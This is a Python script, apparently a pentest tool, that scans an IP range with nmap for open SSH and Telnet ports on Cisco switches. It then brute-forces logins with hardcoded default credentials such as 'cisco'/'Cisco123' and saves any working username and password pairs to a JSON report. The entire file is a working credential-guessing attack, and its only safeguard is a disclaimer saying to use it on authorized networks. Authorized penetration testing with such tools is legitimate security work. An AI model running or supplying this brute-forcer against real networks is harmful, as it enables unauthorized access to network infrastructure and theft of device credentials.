#!/bin/python3
# -*- coding: utf-8 -*-

"""
Cisco Switch Penetration Testing Tool
Author: Solo
Description: Scans for Cisco switches, tests SSH/Telnet credentials, and generates a report.
Disclaimer: Only use on networks you're authorized to test!
"""

import argparse
import sys
import nmap
import paramiko
import telnetlib  # NOTE: deprecated, slated for removal in Python 3.13.

# CI currently pins Python 3.11, where this still works. Will need a
# replacement (e.g. Telnet via a subprocess wrapper, or dropping Telnet
# support) before upgrading past 3.12.
import json
import re
from datetime import datetime

# Configuration
USERNAME_LIST = ["admin", "cisco", "root", "enable"]
PASSWORD_LIST = ["admin", "cisco", "password", "123456", "enable", "Cisco123"]
REPORT_FILE = "cisco_switch_report.json"
SSH_PORT = 22
TELNET_PORT = 23
TIMEOUT = 5  # seconds for connection attempts


def validate_ip_range(ip_range):
    """Validate CIDR notation IP range format."""
    pattern = re.compile(r"^(\d{1,3}\.){3}\d{1,3}/\d{1,2}$")
    if not pattern.match(ip_range):
        return False

    # Validate each octet
    ip, mask = ip_range.split("/")
    octets = ip.split(".")
    for octet in octets:
        if not 0 <= int(octet) <= 255:
            return False
    if not 0 <= int(mask) <= 32:
        return False

    return True


def scan_network(target_ip_range):
    """Scan for devices with open SSH or Telnet ports."""
    print(f"[*] Scanning {target_ip_range} for Cisco switches...")

    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=target_ip_range, arguments=f"-p {SSH_PORT},{TELNET_PORT} --open")
    except nmap.PortScannerError as e:
        print(f"[-] Nmap scan failed: {e}")
        return []

    devices = []
    for host in nm.all_hosts():
        device_info = {
            "ip": host,
            "ssh_open": nm[host].has_tcp(SSH_PORT),
            "telnet_open": nm[host].has_tcp(TELNET_PORT),
            "hostname": nm[host].hostname() or "Unknown",
        }
        devices.append(device_info)

    return devices


def test_ssh_login(host, username, password):
    """Attempt SSH login using paramiko."""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=SSH_PORT, username=username, password=password, timeout=TIMEOUT)
        # Try executing a simple command to verify access
        stdin, stdout, stderr = ssh.exec_command("show version", timeout=TIMEOUT)
        if "Cisco" in stdout.read().decode():
            return True
    except Exception as e:
        print(f"[-] SSH login failed: {e}")
    finally:
        ssh.close()
    return False


def test_telnet_login(host, username, password):
    """Attempt Telnet login using telnetlib."""
    try:
        tn = telnetlib.Telnet(host, TELNET_PORT, timeout=TIMEOUT)

        # Handle different login prompts
        login_prompt = tn.read_until(b"Username:", timeout=TIMEOUT)
        if not login_prompt:
            login_prompt = tn.read_until(b"login:", timeout=TIMEOUT)

        tn.write(username.encode("ascii") + b"\n")

        password_prompt = tn.read_until(b"Password:", timeout=TIMEOUT)
        if not password_prompt:
            return False

        tn.write(password.encode("ascii") + b"\n")

        # Check for successful login (Cisco prompt)
        response = tn.read_until(b"#", timeout=TIMEOUT)
        if b"#" in response:
            return True
    except Exception as e:
        print(f"[-] Telnet login failed: {e}")
    return False


def brute_force_logins(devices, username_list, password_list):
    """Test credentials against discovered devices."""
    results = []
    for device in devices:
        ip = device["ip"]
        print(f"\n[*] Testing {ip} ({device['hostname']})")

        if device["ssh_open"]:
            print("  [>] Testing SSH...")
            found = False
            for username in username_list:
                if found:
                    break
                for password in password_list:
                    if test_ssh_login(ip, username, password):
                        print(f"  [+] SSH Success: {username}:{password}")
                        results.append(
                            {
                                "ip": ip,
                                "service": "SSH",
                                "username": username,
                                "password": password,
                                "timestamp": datetime.now().isoformat(),
                            }
                        )
                        found = True
                        break  # Stop trying passwords for this user

        if device["telnet_open"]:
            print("  [>] Testing Telnet...")
            found = False
            for username in username_list:
                if found:
                    break
                for password in password_list:
                    if test_telnet_login(ip, username, password):
                        print(f"  [+] Telnet Success: {username}:{password}")
                        results.append(
                            {
                                "ip": ip,
                                "service": "Telnet",
                                "username": username,
                                "password": password,
                                "timestamp": datetime.now().isoformat(),
                            }
                        )
                        found = True
                        break  # Stop trying passwords for this user

    return results


def save_report(results):
    """Write brute-force results to REPORT_FILE as JSON."""
    with open(REPORT_FILE, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n[*] Report saved to {REPORT_FILE}")


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Cisco Switch Penetration Testing Tool - scans for Cisco "
            "switches and tests default SSH/Telnet credentials."
        )
    )
    parser.add_argument(
        "target_ip_range",
        help="Target network in CIDR notation, e.g. 192.168.1.0/24",
    )
    args = parser.parse_args()

    if not validate_ip_range(args.target_ip_range):
        print(f"[-] Invalid IP range: {args.target_ip_range}")
        print("    Expected CIDR notation, e.g. 192.168.1.0/24")
        sys.exit(1)

    devices = scan_network(args.target_ip_range)
    if not devices:
        print("[-] No devices with SSH/Telnet open found.")
        return

    print(f"[*] Found {len(devices)} device(s) with SSH/Telnet open.")
    results = brute_force_logins(devices, USERNAME_LIST, PASSWORD_LIST)

    if results:
        print(f"\n[+] {len(results)} credential(s) found.")
        save_report(results)
    else:
        print("\n[-] No valid credentials found.")


if __name__ == "__main__":
    main()
